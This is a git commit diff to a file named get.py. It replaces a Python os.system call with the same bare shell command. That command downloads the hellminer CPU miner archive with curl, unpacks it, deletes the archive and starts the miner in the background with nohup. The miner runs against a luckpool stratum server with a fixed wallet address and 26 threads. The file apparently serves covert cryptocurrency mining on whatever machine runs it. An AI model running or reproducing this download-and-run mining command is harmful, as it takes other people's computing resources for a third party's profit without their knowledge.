753ad2d6351223b89520ab42a16d158b20d41940
lambohopo <86089421+lambohopo@users.noreply.github.com>
2021-11-27 21:14:49 +0700

    Update get.py

--- get.py
+++ get.py
@@ -1,2 +1,1 @@
-import os
-os.system('curl https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz --output hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && rm hellminer_cpu* && nohup ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK -p x -t 26")
+curl https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz --output hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && rm hellminer_cpu* && nohup ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK -p x -t 26
